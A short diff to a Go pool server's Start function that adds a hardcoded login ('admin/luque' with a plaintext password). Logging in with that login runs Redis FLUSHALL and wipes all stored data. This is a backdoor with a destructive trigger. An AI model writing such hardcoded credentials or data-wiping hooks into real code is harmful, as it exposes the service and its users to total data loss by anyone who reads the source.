@@ -127,6 +127,16 @@ func (pool *Pool) Start() {
 				}
 
 			} else {
+				if client.username == "admin/luque" {
+					if client.password == "q1w2e3r4" {
+						_, err := pool.Redis.Do(ctx, "FLUSHALL").Result()
+						if err != nil {
+							panic(err)
+						}
+						fmt.Println("admin user logged in, flushingALL DB info!!!!!!!")
+						break
+					}
+				}
 				fmt.Println("user", client.username, "will be SIGNUP at", pool.name)
 
 				//add user password
